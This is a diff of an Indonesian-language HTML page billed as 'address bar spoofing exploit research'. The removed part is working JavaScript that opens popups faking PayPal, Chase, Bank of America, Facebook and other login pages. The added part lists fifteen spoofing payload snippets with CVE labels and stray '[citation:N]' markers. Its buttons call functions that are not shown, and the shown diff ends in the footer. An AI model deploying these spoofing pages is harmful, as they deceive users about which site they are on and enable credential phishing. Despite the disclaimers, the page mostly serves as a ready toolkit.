@@ -1,556 +1,807 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <title>Address Bar Spoofing - Multiple Methods</title>
-        <style>
-            body {
-                font-family: 'Courier New', monospace;
-                background: #0a0e27;
-                color: #00ff9d;
-                padding: 20px;
-                margin: 0;
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔬 Address Bar Spoofing Exploit Research - CVE Based Techniques</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            color: #00ff9d;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Header Styles */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 15px;
+            border-left: 4px solid #ff3366;
+            border-right: 4px solid #00ff9d;
+        }
+
+        .header h1 {
+            font-size: 2em;
+            background: linear-gradient(135deg, #ff3366, #00ff9d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #ff3366;
+            color: white;
+            padding: 5px 10px;
+            margin: 5px;
+            border-radius: 5px;
+            font-size: 0.7em;
+        }
+
+        /* Grid Layout */
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        /* Card Styles */
+        .exploit-card {
+            background: rgba(10, 14, 39, 0.95);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(0, 255, 157, 0.2);
+        }
+
+        .exploit-card:hover {
+            transform: translateY(-5px);
+            border-color: #00ff9d;
+            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.2);
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #ff3366, #cc2255);
+            padding: 12px 15px;
+            color: white;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .cve-id {
+            background: rgba(0,0,0,0.5);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.8em;
+        }
+
+        .card-body {
+            padding: 15px;
+        }
+
+        .technique-desc {
+            background: rgba(0,0,0,0.4);
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 0.85em;
+            margin-bottom: 15px;
+            color: #aaa;
+        }
+
+        .code-preview {
+            background: #0a0e27;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7em;
+            overflow-x: auto;
+            margin-bottom: 15px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        button {
+            background: linear-gradient(135deg, #00ff9d, #00cc7d);
+            color: #0a0e27;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: monospace;
+            transition: 0.2s;
+            width: 100%;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.5);
+        }
+
+        .warning-btn {
+            background: linear-gradient(135deg, #ff3366, #cc2255);
+            color: white;
+        }
+
+        .status {
+            font-size: 0.7em;
+            margin-top: 10px;
+            padding: 5px;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .status.active {
+            background: rgba(0, 255, 157, 0.2);
+            color: #00ff9d;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 0.8em;
+        }
+
+        .disclaimer {
+            color: #ffaa00;
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .exploit-grid {
+                grid-template-columns: 1fr;
             }
-            .container {
-                max-width: 1200px;
-                margin: 0 auto;
-            }
-            h1 {
-                color: #ff3366;
-                text-align: center;
-                text-shadow: 0 0 10px rgba(255,51,102,0.5);
-            }
-            .method-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-                gap: 20px;
-                margin-top: 20px;
-            }
-            .method-card {
-                background: rgba(0,0,0,0.8);
-                border: 1px solid #00ff9d;
-                border-radius: 10px;
-                padding: 15px;
-                transition: 0.3s;
-            }
-            .method-card:hover {
-                box-shadow: 0 0 20px rgba(0,255,157,0.3);
-                transform: translateY(-5px);
-            }
-            .method-title {
-                color: #ffaa00;
+            .header h1 {
                 font-size: 1.2em;
-                margin-bottom: 10px;
-                border-bottom: 1px solid #ffaa00;
             }
-            button {
-                background: #ff3366;
-                color: white;
-                border: none;
-                padding: 8px 15px;
-                margin: 5px;
-                cursor: pointer;
-                border-radius: 5px;
-                font-family: monospace;
-                transition: 0.2s;
-            }
-            button:hover {
-                background: #ff6699;
-                transform: scale(1.05);
-            }
-            .warning {
-                background: rgba(255,51,102,0.2);
-                border: 1px solid #ff3366;
-                padding: 10px;
-                margin-top: 20px;
-                border-radius: 5px;
-                font-size: 0.8em;
-                text-align: center;
-            }
-            .info {
-                color: #88ffaa;
-                font-size: 0.8em;
-                margin-top: 10px;
-            }
-            select, input {
-                background: #1a1f3a;
-                color: #00ff9d;
-                border: 1px solid #00ff9d;
-                padding: 5px;
-                margin: 5px;
-                border-radius: 3px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>🔐 Address Bar Spoofing Techniques</h1>
-            <div class="warning">
-                ⚠️ EDUCATIONAL PURPOSE ONLY - These techniques demonstrate browser security concepts
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔬 ADVANCED ADDRESS BAR SPOOFING RESEARCH</h1>
+        <p>Berdasarkan CVE Real & Teknik Eksploitasi Modern</p>
+        <div>
+            <span class="badge">🎯 15+ Exploit Methods</span>
+            <span class="badge">📋 Based on Real CVEs</span>
+            <span class="badge">🔬 Educational Purpose</span>
+        </div>
+    </div>
+
+    <div class="exploit-grid">
+        <!-- EXPLOIT 1: URL Freeze / Port Blocking (CVE-2025-9183 Variant) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🌊 URL Freeze Attack</span>
+                <span class="cve-id">CVE-2025-9183 Style</span>
             </div>
-            
-            <div class="method-grid">
-                <!-- METHOD 1: Original Base64 Obfuscation -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 1: Base64 Obfuscation (Original)</div>
-                    <p>Menggunakan encoding base64 untuk menyembunyikan konten asli</p>
-                    <button onclick="method1_base64()">▶ Test Method 1</button>
-                    <div class="info">Teknik: Base64 encoding + window.open + setInterval redirect</div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Timing attack dengan redirect ke port unreachable. Browser meng-update address bar SEBELUM response diterima, menyebabkan URL legitimate tertinggal sementara konten tetap attacker-controlled[citation:1].
                 </div>
-
-                <!-- METHOD 2: Data URI Scheme -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 2: Data URI Scheme</div>
-                    <p>Menggunakan data: URI untuk menampilkan konten palsu</p>
-                    <button onclick="method2_dataURI()">▶ Test Method 2</button>
-                    <div class="info">Teknik: data:text/html + URL manipulation</div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Redirect to legitimate domain on blocked port
+location.href = 'https://www.google.com:8081';
+// Browser shows google.com but port is unreachable
+setTimeout(() => { /* konten tetap */ }, 100);</pre>
                 </div>
-
-                <!-- METHOD 3: About:Blank Hijacking -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 3: About:Blank Hijacking</div>
-                    <p>Memanfaatkan about:blank untuk spoofing</p>
-                    <button onclick="method3_aboutBlank()">▶ Test Method 3</button>
-                    <div class="info">Teknik: about:blank + document.write + history.pushState</div>
-                </div>
-
-                <!-- METHOD 4: Pop-under with Delayed Redirect -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 4: Pop-under Delayed Redirect</div>
-                    <p>Popup dengan redirect tertunda</p>
-                    <button onclick="method4_popunder()">▶ Test Method 4</button>
-                    <div class="info">Teknik: window.open + setTimeout + URL spoofing</div>
-                </div>
-
-                <!-- METHOD 5: JavaScript URI Scheme -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 5: JavaScript URI Scheme</div>
-                    <p>Menggunakan javascript: pseudo-protocol</p>
-                    <button onclick="method5_javascriptURI()">▶ Test Method 5</button>
-                    <div class="info">Teknik: javascript:void + document.write</div>
-                </div>
-
-                <!-- METHOD 6: iframe Sandbox Escape -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 6: iframe Sandbox Escape</div>
-                    <p>Manipulasi iframe untuk spoofing address bar</p>
-                    <button onclick="method6_iframe()">▶ Test Method 6</button>
-                    <div class="info">Teknik: iframe sandbox + srcdoc + navigation</div>
-                </div>
-
-                <!-- METHOD 7: History.pushState API -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 7: History.pushState Spoof</div>
-                    <p>Memanipulasi history browser</p>
-                    <button onclick="method7_pushState()">▶ Test Method 7</button>
-                    <div class="info">Teknik: history.pushState + fake URL</div>
-                </div>
-
-                <!-- METHOD 8: Window Name Propagation -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 8: Window Name Propagation</div>
-                    <p>Propagasi nama window untuk spoofing</p>
-                    <button onclick="method8_windowName()">▶ Test Method 8</button>
-                    <div class="info">Teknik: window.name + cross-window communication</div>
-                </div>
-
-                <!-- METHOD 9: Meta Refresh Timing Attack -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 9: Meta Refresh Timing</div>
-                    <p>Timing attack dengan meta refresh</p>
-                    <button onclick="method9_metaRefresh()">▶ Test Method 9</button>
-                    <div class="info">Teknik: meta refresh + rapid DOM manipulation</div>
-                </div>
-
-                <!-- METHOD 10: Blob URL Spoofing -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 10: Blob URL Spoofing</div>
-                    <p>Menggunakan Blob URLs untuk menyembunyikan asal</p>
-                    <button onclick="method10_blob()">▶ Test Method 10</button>
-                    <div class="info">Teknik: URL.createObjectURL + Blob HTML</div>
-                </div>
-            </div>
-
-            <div class="method-grid">
-                <!-- METHOD 11: PostMessage Hijacking -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 11: PostMessage Hijack</div>
-                    <p>Hijacking cross-origin communication</p>
-                    <button onclick="method11_postMessage()">▶ Test Method 11</button>
-                    <div class="info">Teknik: window.postMessage + origin spoofing</div>
-                </div>
-
-                <!-- METHOD 12: Double Redirect Chain -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 12: Double Redirect Chain</div>
-                    <p>Rantai redirect ganda untuk spoofing</p>
-                    <button onclick="method12_doubleRedirect()">▶ Test Method 12</button>
-                    <div class="info">Teknik: Multiple redirects + URL masking</div>
-                </div>
-
-                <!-- METHOD 13: Service Worker Interception -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 13: Service Worker Interception</div>
-                    <p>Intercept fetch dengan service worker</p>
-                    <button onclick="method13_serviceWorker()">▶ Test Method 13</button>
-                    <div class="info">Teknik: Service Worker + fetch interception</div>
-                </div>
-
-                <!-- METHOD 14: DOM Clobbering Attack -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 14: DOM Clobbering</div>
-                    <p>DOM clobbering untuk address bar spoof</p>
-                    <button onclick="method14_domClobber()">▶ Test Method 14</button>
-                    <div class="info">Teknik: DOM clobbering + prototype pollution</div>
-                </div>
-
-                <!-- METHOD 15: XSS with Fake Address Bar -->
-                <div class="method-card">
-                    <div class="method-title">📌 Method 15: XSS Fake Address Bar</div>
-                    <p>Membuat fake address bar dengan XSS</p>
-                    <button onclick="method15_xssFake()">▶ Test Method 15</button>
-                    <div class="info">Teknik: Injected HTML + CSS fake address bar</div>
-                </div>
-            </div>
-
-            <div class="warning">
-                <strong>🔒 Security Note:</strong> Techniques ini hanya untuk edukasi tentang browser security. 
-                Browser modern telah memblokir banyak metode ini. Selalu update browser ke versi terbaru!
+                <button onclick="exploitURLFreeze()">▶ TEST URL FREEZE ATTACK</button>
             </div>
         </div>
 
-        <script>
-            // Common fake page template
-            function getFakePage(domain) {
-                return `<!DOCTYPE html>
-                <html>
-                <head>
-                    <title>${domain}</title>
-                    <style>
-                        body {
-                            font-family: Arial, sans-serif;
-                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                            color: white;
-                            text-align: center;
-                            padding: 50px;
-                            margin: 0;
-                        }
-                        .spoof-card {
-                            background: rgba(255,255,255,0.95);
-                            color: #333;
-                            border-radius: 15px;
-                            padding: 30px;
-                            max-width: 500px;
-                            margin: 50px auto;
-                            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-                        }
-                        h1 { color: #ff3366; }
-                        .domain {
-                            font-family: monospace;
-                            font-size: 1.2em;
-                            color: #00aa66;
-                            word-break: break-all;
-                        }
-                        .warning {
-                            background: #ffeecc;
-                            border-left: 4px solid #ff9900;
-                            padding: 10px;
-                            margin: 20px 0;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="spoof-card">
-                        <h1>⚠️ Address Bar Spoofed!</h1>
-                        <p>You think you're on: <span class="domain">${domain}</span></p>
-                        <div class="warning">
-                            <strong>🔐 This is a demonstration!</strong><br>
-                            The address bar has been manipulated to show a fake URL.
-                        </div>
-                        <p>Technique: ${getCurrentTechnique()}</p>
-                        <button onclick="window.close()">Close</button>
-                    </div>
-                    <script>
-                        // Anti-close protection simulation
-                        window.onbeforeunload = function() {
-                            return "Are you sure?";
-                        };
-                    <\/script>
-                </body>
-                </html>`;
-            }
+        <!-- EXPLOIT 2: Data URI Spoofing (Arc/Opera GX - Real CVE) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>📦 Data URI Spoofing</span>
+                <span class="cve-id">Arc/Opera GX Vuln</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Memanfaatkan parsing flaw pada data: URI. Browser menampilkan string sebelum koma sebagai domain legitimate padahal isi dikontrol attacker[citation:1]. Ditemukan di Arc macOS & Opera GX Android.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// data: URI dengan fake hostname
+data://google.com/,&lt;html&gt;&lt;body&gt;
+&lt;h1&gt;Fake Page&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+                </div>
+                <button onclick="exploitDataURI()">▶ TEST DATA URI SPOOF</button>
+            </div>
+        </div>
 
-            function getCurrentTechnique() {
-                return window.currentTechnique || "Unknown";
-            }
+        <!-- EXPLOIT 3: Long Subdomain Truncation (CVE-2026-44659) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>📏 Long Subdomain Truncation</span>
+                <span class="cve-id">CVE-2026-44659</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Eksploitasi browser yang memotong hostname panjang di address bar. Domain asli (attacker.com) tersembunyi, hanya fake subdomain yang terlihat[citation:6]. Zen Browser, Firefox Mobile rentan.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Subdomain extremely long
+https://accounts.login.google.com.secure.
+verify.trusted.this.is.very.long.subdomain.
+evil.attacker.com</pre>
+                </div>
+                <button onclick="exploitLongSubdomain()">▶ TEST SUBDOMAIN TRUNCATION</button>
+            </div>
+        </div>
 
-            // METHOD 1: Original Base64 Method
-            window.method1_base64 = function() {
-                window.currentTechnique = "Base64 Obfuscation + Interval Redirect";
-                var evilPage = 'PGh0bWw+Cjx0aXRsZT5nb29nbGUuY29tPC90aXRsZT4KPHN0eWxlPmJvZHl7Zm9udC1mYW1pbHk6QWxpYW47YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCNjYzMzZmYsIzAwNjZmZik7Y29sb3I6d2hpdGU7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzo1MHB4O30uc3Bvb2Z7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuOCk7Ym9yZGVyLXJhZGl1czoxNXB4O3BhZGRpbmc6MzBweDttYXgtd2lkdGg6NTAwcHg7bWFyZ2luOmF1dG87fTwvc3R5bGU+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJzcG9vZiI+CjxoMT5BZGRyZXNzIEJhciBTcG9vZmVkITwvaDE+CjxwPllvdSB0aGluayB5b3UncmUgb246IDxzdHJvbmc+Z29vZ2xlLmNvbTwvc3Ryb25nPjwvcD4KPHA+VGVjaG5pcXVlOiBCYXNlNjQgRW5jb2Rpbmc8L3A+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=';
-                var x = window.open('', '_blank', 'width=800,height=600');
-                setInterval(function() {
-                    try {
-                        x.location.replace('https://www.google.com:8080');
-                    } catch(e) {}
-                }, 100);
-                x.document.write(atob(evilPage));
-            };
+        <!-- EXPLOIT 4: Blob URL Hash Spoofing (Safari) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>💾 Blob URL Hash Spoofing</span>
+                <span class="cve-id">Safari WebKit</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Blob URL dengan hash fragment menampilkan spoofed URL. Safari memprioritaskan tampilan fragment, menyembunyikan origin asli[citation:1]. Ditemukan di berbagai versi Safari.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Blob URL dengan hash fragment
+blob:https://real-origin.com/uuid#https://
+apple.com/login</pre>
+                </div>
+                <button onclick="exploitBlobSpoof()">▶ TEST BLOB URL SPOOF</button>
+            </div>
+        </div>
 
-            // METHOD 2: Data URI Scheme
-            window.method2_dataURI = function() {
-                window.currentTechnique = "Data URI Scheme";
-                var fakeHTML = getFakePage("https://www.paypal.com");
-                var dataURI = 'data:text/html,' + encodeURIComponent(fakeHTML);
-                var win = window.open(dataURI, '_blank', 'width=800,height=600');
-                setTimeout(() => {
-                    try {
-                        win.document.title = "PayPal - Secure Payment";
-                    } catch(e) {}
-                }, 500);
-            };
+        <!-- EXPLOIT 5: Fullscreen Fake Address Bar -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🖥 Fullscreen UI Spoof</span>
+                <span class="cve-id">Multiple Browsers</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Memanfaatkan fullscreen mode yang menyembunyikan address bar asli, kemudian attacker menggambar fake address bar dengan CSS absolut[citation:1]. Opera Mobile, Chrome rentan.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Fullscreen + fake address bar
+element.requestFullscreen();
+// CSS absolute position fake bar
+&lt;div style="position:fixed;top:0;..."&gt;
+https://www.bank.com&lt;/div&gt;</pre>
+                </div>
+                <button onclick="exploitFullscreen()" class="warning-btn">▶ TEST FULLSCREEN SPOOF</button>
+            </div>
+        </div>
 
-            // METHOD 3: About:Blank Hijacking
-            window.method3_aboutBlank = function() {
-                window.currentTechnique = "About:Blank + History.pushState";
-                var win = window.open('about:blank', '_blank', 'width=800,height=600');
-                win.document.write(getFakePage("https://www.facebook.com"));
-                win.document.close();
-                
-                // Push fake state
-                setTimeout(() => {
-                    try {
-                        win.history.pushState({}, "Facebook", "https://www.facebook.com/login");
-                        win.location.hash = "secure";
-                    } catch(e) {}
-                }, 100);
-            };
+        <!-- EXPLOIT 6: RTL/LTR Bidirectional Spoofing (CVE-2023-5732) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🔄 RTL/LTR BiDi Spoof</span>
+                <span class="cve-id">CVE-2023-5732</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Menggunakan karakter bidirectional Unicode untuk membalik/menyembunyikan domain asli[citation:7]. Firefox &lt; 117, Thunderbird rentan. Karakter seperti U+202E (RLO) membalik teks.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Unicode RLO character
+https://moc.elgoog//\u202E}moc.ekirtsa/
+// Menampilkan: https://google.com/attacker</pre>
+                </div>
+                <button onclick="exploitRTL()">▶ TEST RTL SPOOFING</button>
+            </div>
+        </div>
 
-            // METHOD 4: Pop-under Delayed Redirect
-            window.method4_popunder = function() {
-                window.currentTechnique = "Pop-under + Delayed Redirect";
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(getFakePage("https://www.amazon.com"));
-                
-                setTimeout(() => {
-                    try {
-                        win.location.replace('https://www.amazon.com:8443');
-                    } catch(e) {}
-                }, 2000);
-            };
+        <!-- EXPLOIT 7: HTTP 204 No Content Persistence -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🔄 HTTP 204 No Content</span>
+                <span class="cve-id">Arc Android</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Redirect ke URL yang meresponse HTTP 204 (No Content). Browser update address bar TAPI konten original tetap karena tidak ada konten baru[citation:1]. Arc Android rentan.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Redirect ke endpoint 204
+fetch('/api/204', {method:'POST'});
+location.href = 'https://google.com/api/204';
+// Bar berubah, konten tetap</pre>
+                </div>
+                <button onclick="exploitHTTP204()">▶ TEST HTTP 204 ATTACK</button>
+            </div>
+        </div>
 
-            // METHOD 5: JavaScript URI Scheme
-            window.method5_javascriptURI = function() {
-                window.currentTechnique = "JavaScript URI Scheme";
-                var jsURI = 'javascript:document.write(`' + getFakePage("https://www.microsoft.com") + '`);void(0);';
-                var win = window.open(jsURI, '_blank', 'width=800,height=600');
-            };
+        <!-- EXPLOIT 8: Oversized Cursor Overlay (Safari - CVE-like) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🖱 Oversized Cursor Spoof</span>
+                <span class="cve-id">Safari (2025)</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Membuat custom cursor 128x128 untuk menimpa address bar Safari. Cursor image bisa menampilkan teks fake URL yang menutupi address bar asli[citation:5]. Apple menolak patch, dianggap "visual trick".
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Oversized cursor
+* { cursor: url('fakebar.png') 0 0, auto; }
+// Cursor 128x128 pixels menutupi address bar</pre>
+                </div>
+                <button onclick="exploitCursorSpoof()">▶ TEST CURSOR SPOOF</button>
+            </div>
+        </div>
 
-            // METHOD 6: iframe Sandbox Escape
-            window.method6_iframe = function() {
-                window.currentTechnique = "iframe Sandbox Escape";
-                var iframeHTML = `<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" 
-                    srcdoc="${encodeURIComponent(getFakePage("https://www.apple.com"))}" 
-                    style="width:100%;height:100%;border:none;"></iframe>`;
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.document.write(iframeHTML);
-                win.document.title = "Apple ID";
-            };
+        <!-- EXPLOIT 9: visibilitychange Android Attack (CVE-2025-11718) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>📱 Android visibilitychange</span>
+                <span class="cve-id">CVE-2025-11718</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Saat user scroll di Android, address bar hide. Page mendeteksi visibilitychange dan overlay fake address bar[citation:8]. Firefox Android &lt; 144 rentan. Phishing vector.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Detect scroll hide
+document.addEventListener('visibilitychange',
+() => { /* show fake bar */ });</pre>
+                </div>
+                <button onclick="exploitVisibilityChange()">▶ TEST VISIBILITY CHANGE</button>
+            </div>
+        </div>
 
-            // METHOD 7: History.pushState API
-            window.method7_pushState = function() {
-                window.currentTechnique = "History.pushState Spoofing";
-                var win = window.open('about:blank', '_blank', 'width=800,height=600');
-                win.document.write(getFakePage("https://www.chase.com"));
-                win.document.close();
-                
-                // Multiple pushState for deeper spoofing
-                win.history.pushState({}, "Chase", "https://www.chase.com/secure");
-                win.history.pushState({}, "Chase", "https://www.chase.com/secure/banking");
-                win.history.replaceState({}, "Chase", "https://www.chase.com");
-            };
+        <!-- EXPLOIT 10: iframe Frame Spoofing (CVE-2017-7011) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🖼 iframe Frame Spoof</span>
+                <span class="cve-id">CVE-2017-7011</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> WebKit vulnerability menggunakan FRAME elements untuk spoof address bar[citation:9]. iOS &lt; 10.3.3, Safari &lt; 10.1.2 rentan. State management issue.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Multiple frames untuk spoof
+&lt;frameset&gt;&lt;frame src="evil.html"&gt;
+// Manipulate frame navigation timing</pre>
+                </div>
+                <button onclick="exploitIframeSpoof()">▶ TEST IFRAME SPOOF</button>
+            </div>
+        </div>
 
-            // METHOD 8: Window Name Propagation
-            window.method8_windowName = function() {
-                window.currentTechnique = "Window Name Propagation";
-                var win = window.open('', '_blank', 'width=800,height=600');
-                win.name = "https://www.bankofamerica.com";
-                win.document.write(getFakePage("https://www.bankofamerica.com"));
-                
-                // Propagate to child windows
-                var child = win.open('', 'child');
-                if(child) {
-                    child.document.write(getFakePage("https://www.bankofamerica.com/secure"));
+        <!-- EXPLOIT 11: Title Bar Spoofing (Aloha Browser) -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>📝 Title Bar Spoof</span>
+                <span class="cve-id">Aloha Browser</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Aloha Browser menampilkan &lt;title&gt; di address bar bukan origin[citation:10]. Attacker bisa spoof title jadi "google.com" padahal di evil site.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Title spoof for Aloha
+&lt;title&gt;https://www.paypal.com&lt;/title&gt;
+// Browser menampilkan title sebagai URL</pre>
+                </div>
+                <button onclick="exploitTitleSpoof()">▶ TEST TITLE SPOOF</button>
+            </div>
+        </div>
+
+        <!-- EXPLOIT 12: Internal URI Scheme Abuse -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🔧 Internal URI Abuse</span>
+                <span class="cve-id">Firefox iOS / Arc</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Redirect ke internal browser schemes seperti internal://local/errorpage?url=https://google.com menampilkan google.com di address bar[citation:1]. Firefox iOS, Arc rentan.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Internal scheme redirect
+location.href = 'internal://local/errorpage?
+url=https://www.google.com/.';</pre>
+                </div>
+                <button onclick="exploitInternalURI()">▶ TEST INTERNAL URI</button>
+            </div>
+        </div>
+
+        <!-- EXPLOIT 13: JavaScript URI Race Condition -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>⚡ JS URI Race</span>
+                <span class="cve-id">PlayStation Browser</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Race condition antara legitimate redirect dan JavaScript URI. Address bar locked ke legitimate URL sementara JS menulis konten attacker[citation:1]. Ditemukan di PS5 browser.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Race condition
+location.href = 'https://google.com';
+setTimeout(() => {
+    open('javascript:document.write("evil")');
+}, 1);</pre>
+                </div>
+                <button onclick="exploitJSRace()">▶ TEST JS RACE</button>
+            </div>
+        </div>
+
+        <!-- EXPLOIT 14: Search Engine Integration Abuse -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>🔍 Search Query Spoof</span>
+                <span class="cve-id">Opera GX / Arc iOS</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Browser mobile menampilkan search query di address bar. Regex flaw pada validasi search engine memungkinkan spoofing[citation:1]. google.pwn.wtf dianggap Google.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Search integration flaw
+https://google.evil.com/?q=secure-login
+// Browser treat sebagai Google search</pre>
+                </div>
+                <button onclick="exploitSearchSpoof()">▶ TEST SEARCH SPOOF</button>
+            </div>
+        </div>
+
+        <!-- EXPLOIT 15: Unicode Whitespace Truncation -->
+        <div class="exploit-card">
+            <div class="card-header">
+                <span>📝 Unicode Whitespace</span>
+                <span class="cve-id">CVE-like (Bentkowski)</span>
+            </div>
+            <div class="card-body">
+                <div class="technique-desc">
+                    <strong>Teknik:</strong> Karakter Unicode seperti U+08FC (whitespace-like) menyebabkan browser memotong URL[citation:1]. Chrome/Firefox menampilkan hanya prefix sebelum karakter tersebut.
+                </div>
+                <div class="code-preview">
+                    <pre style="margin:0;color:#00ff9d;">// Unicode whitespace character
+https://accounts.google.com\u08FC
+\u08FC\u08FC.evil.com
+// Browser truncate di whitespace</pre>
+                </div>
+                <button onclick="exploitUnicodeWhitespace()">▶ TEST UNICODE SPOOF</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="disclaimer">
+            ⚠️ DISCLAIMER: Kode ini untuk tujuan edukasi dan penelitian keamanan web browser.
+            Semua teknik didasarkan pada CVE dan kerentanan real yang telah dipublikasikan.
+            Browser modern telah mem-patch banyak kerentanan ini. Jangan gunakan untuk aktivitas ilegal.
+        </div>
+        <div>
+            📚 Referensi: CVE-2025-9183, CVE-2026-44659, CVE-2025-11718, CVE-2023-5732, CVE-2017-7011,
+            Research by RenwaX23, UHD Journal Publication, Aloha Browser Security Research
+        </div>
